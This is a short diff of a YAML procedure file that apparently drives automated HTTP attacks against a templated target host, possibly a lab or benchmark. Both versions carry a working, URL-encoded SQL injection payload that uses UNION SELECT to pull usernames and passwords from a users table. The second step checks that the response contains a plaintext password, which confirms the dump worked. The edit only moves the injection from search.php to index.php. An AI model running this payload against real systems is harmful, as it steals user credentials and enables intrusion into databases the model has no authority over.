@@ -1,0 +1,20 @@
+--- attempt_1/procedure.yaml
++++ attempt_2/procedure.yaml
+@@ -4,7 +4,7 @@
+     headers: {}
+     method: GET
+     type: http_request
+-    url: http://${target_host}:${target_port}/search.php?search=x%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--+-
++    url: http://${target_host}:${target_port}/index.php?search=test
+   expect:
+     status: 200
+   outputs: {}
+@@ -16,7 +16,7 @@
+     headers: {}
+     method: GET
+     type: http_request
+-    url: http://${target_host}:${target_port}/search.php?search=x%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--+-
++    url: http://${target_host}:${target_port}/index.php?search=x%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--+-
+   expect:
+     body_contains: S3cr3tP@ss!
+   outputs: {}
